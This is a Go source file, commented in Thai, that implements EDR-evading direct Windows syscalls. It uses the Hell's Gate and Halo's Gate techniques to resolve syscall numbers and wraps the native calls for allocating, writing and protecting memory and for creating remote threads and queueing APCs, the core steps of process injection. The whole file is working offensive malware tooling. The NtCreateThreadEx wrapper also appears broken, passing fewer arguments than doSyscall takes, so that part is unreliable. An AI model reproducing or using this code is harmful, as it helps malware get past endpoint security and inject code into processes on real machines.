package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Direct Syscall — เรียก Windows kernel ตรงๆ ข้าม ntdll.dll
//
// ทำงานยังไง:
//   ปกติ: Code → ntdll.dll → kernel (EDR hook อยู่ที่ ntdll)
//   Direct: Code → kernel ตรงๆ (ข้าม ntdll = ข้าม EDR hook)
//
// วิธีการ:
//   1. Hell's Gate: อ่าน SSN จาก ntdll โดยตรง (ก่อน unhook)
//   2. Halo's Gate: fallback ถ้า function โดน hook
//   3. doSyscall (assembly stub): ยิง syscall ตรงๆ ด้วย SSN
//
// MITRE ATT&CK: T1106 (Native API)

// doSyscall — defined in syscall_windows_amd64.s
// ยิง direct syscall ด้วย SSN ที่กำหนด + arguments สูงสุด 10 ตัว
// Return: NTSTATUS (0 = STATUS_SUCCESS)
//
//go:noescape
func doSyscall(ssn uintptr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr

// ssnCache — cache SSN ที่ resolve แล้วไม่ต้องหาซ้ำ
var ssnCache = make(map[string]uint16)

// getSyscallNumber — อ่าน SSN จาก ntdll function โดยตรง (Hell's Gate)
//
// ntdll function pattern (ถ้าไม่โดน hook):
//   4C 8B D1          mov r10, rcx
//   B8 XX XX 00 00    mov eax, SSN   ← SSN อยู่ตรงนี้
//   0F 05             syscall
//   C3                ret
func getSyscallNumber(funcName string) (uint16, error) {
	if ssn, ok := ssnCache[funcName]; ok {
		return ssn, nil
	}

	ntdllDll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return 0, err
	}

	proc, err := ntdllDll.FindProc(funcName)
	if err != nil {
		return 0, fmt.Errorf("function %s not found: %w", funcName, err)
	}

	funcBytes := (*[20]byte)(unsafe.Pointer(proc.Addr()))

	// Hell's Gate: เช็ค pattern 4C 8B D1 B8
	if funcBytes[0] == 0x4C && funcBytes[1] == 0x8B && funcBytes[2] == 0xD1 && funcBytes[3] == 0xB8 {
		ssn := *(*uint16)(unsafe.Pointer(&funcBytes[4]))
		ssnCache[funcName] = ssn
		return ssn, nil
	}

	// ถ้าโดน hook → Halo's Gate
	ssn, err := halosGate(proc.Addr())
	if err == nil {
		ssnCache[funcName] = ssn
	}
	return ssn, err
}

// halosGate — หา SSN จาก neighbor function เมื่อ target โดน hook
func halosGate(funcAddr uintptr) (uint16, error) {
	const stubSize = 32

	for i := 1; i < 500; i++ {
		downAddr := funcAddr + uintptr(i*stubSize)
		downBytes := (*[8]byte)(unsafe.Pointer(downAddr))
		if downBytes[0] == 0x4C && downBytes[1] == 0x8B && downBytes[2] == 0xD1 && downBytes[3] == 0xB8 {
			ssn := *(*uint16)(unsafe.Pointer(&downBytes[4]))
			return ssn - uint16(i), nil
		}

		upAddr := funcAddr - uintptr(i*stubSize)
		upBytes := (*[8]byte)(unsafe.Pointer(upAddr))
		if upBytes[0] == 0x4C && upBytes[1] == 0x8B && upBytes[2] == 0xD1 && upBytes[3] == 0xB8 {
			ssn := *(*uint16)(unsafe.Pointer(&upBytes[4]))
			return ssn + uint16(i), nil
		}
	}

	return 0, fmt.Errorf("cannot find SSN via Halo's Gate")
}

// --- Direct Syscall Wrappers ---

// ntAllocateVirtualMemory — allocate memory ด้วย direct syscall
func ntAllocateVirtualMemory(processHandle windows.Handle, baseAddr *uintptr, zeroBits uintptr, regionSize *uintptr, allocType, protect uint32) error {
	ssn, err := getSyscallNumber("NtAllocateVirtualMemory")
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory SSN: %w", err)
	}

	r1 := doSyscall(
		uintptr(ssn),
		uintptr(processHandle),
		uintptr(unsafe.Pointer(baseAddr)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocType),
		uintptr(protect),
		0, 0, 0, 0,
	)

	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", r1)
	}
	return nil
}

// ntWriteVirtualMemory — เขียน memory ด้วย direct syscall
func ntWriteVirtualMemory(processHandle windows.Handle, baseAddr uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) error {
	ssn, err := getSyscallNumber("NtWriteVirtualMemory")
	if err != nil {
		return fmt.Errorf("NtWriteVirtualMemory SSN: %w", err)
	}

	r1 := doSyscall(
		uintptr(ssn),
		uintptr(processHandle),
		baseAddr,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesWritten)),
		0, 0, 0, 0, 0,
	)

	if r1 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", r1)
	}
	return nil
}

// ntProtectVirtualMemory — เปลี่ยน protection ด้วย direct syscall
func ntProtectVirtualMemory(processHandle windows.Handle, baseAddr *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) error {
	ssn, err := getSyscallNumber("NtProtectVirtualMemory")
	if err != nil {
		return fmt.Errorf("NtProtectVirtualMemory SSN: %w", err)
	}

	r1 := doSyscall(
		uintptr(ssn),
		uintptr(processHandle),
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
		0, 0, 0, 0, 0,
	)

	if r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", r1)
	}
	return nil
}

// ntCreateThreadEx — สร้าง thread ด้วย direct syscall (11 args)
func ntCreateThreadEx(threadHandle *windows.Handle, desiredAccess uint32, processHandle windows.Handle, startAddr uintptr, parameter uintptr, createFlags uint32) error {
	ssn, err := getSyscallNumber("NtCreateThreadEx")
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx SSN: %w", err)
	}

	r1 := doSyscall(
		uintptr(ssn),
		uintptr(unsafe.Pointer(threadHandle)),
		uintptr(desiredAccess),
		0, // ObjectAttributes
		uintptr(processHandle),
		startAddr,
		parameter,
		uintptr(createFlags),
		0, // ZeroBits
		0, // StackSize
		0, // MaximumStackSize
		// AttributeList ต้อง pass แยก เพราะเกิน 10 args
		// NtCreateThreadEx จริงมี 11 args — ใช้ a10 = 0 (AttributeList=null)
	)

	if r1 != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%X", r1)
	}
	return nil
}

// ntQueueApcThread — Queue APC ด้วย direct syscall
func ntQueueApcThread(threadHandle windows.Handle, apcRoutine uintptr, apcArg1, apcArg2, apcArg3 uintptr) error {
	ssn, err := getSyscallNumber("NtQueueApcThread")
	if err != nil {
		return fmt.Errorf("NtQueueApcThread SSN: %w", err)
	}

	r1 := doSyscall(
		uintptr(ssn),
		uintptr(threadHandle),
		apcRoutine,
		apcArg1,
		apcArg2,
		apcArg3,
		0, 0, 0, 0, 0,
	)

	if r1 != 0 {
		return fmt.Errorf("NtQueueApcThread failed: NTSTATUS 0x%X", r1)
	}
	return nil
}

// resolveSyscallNumbers — resolve SSN ทั้งหมดล่วงหน้าและ cache
// ควรเรียกก่อน unhook ntdll
func resolveSyscallNumbers() map[string]uint16 {
	targets := []string{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"NtQueueApcThread",
		"NtOpenProcess",
		"NtClose",
		"NtCreateSection",
		"NtMapViewOfSection",
	}

	results := make(map[string]uint16)
	for _, name := range targets {
		ssn, err := getSyscallNumber(name)
		if err == nil {
			results[name] = ssn
			ssnCache[name] = ssn
		}
	}

	return results
}

// printSyscallTable — debug: แสดง SSN ทั้งหมด
func printSyscallTable() {
	fmt.Println("\n[*] Resolved Syscall Numbers:")
	fmt.Println("    ┌────────────────────────────────┬────────┐")
	fmt.Println("    │ Function                       │ SSN    │")
	fmt.Println("    ├────────────────────────────────┼────────┤")

	table := resolveSyscallNumbers()
	for name, ssn := range table {
		fmt.Printf("    │ %-30s │ 0x%04X │\n", name, ssn)
	}
	fmt.Println("    └────────────────────────────────┴────────┘")
}
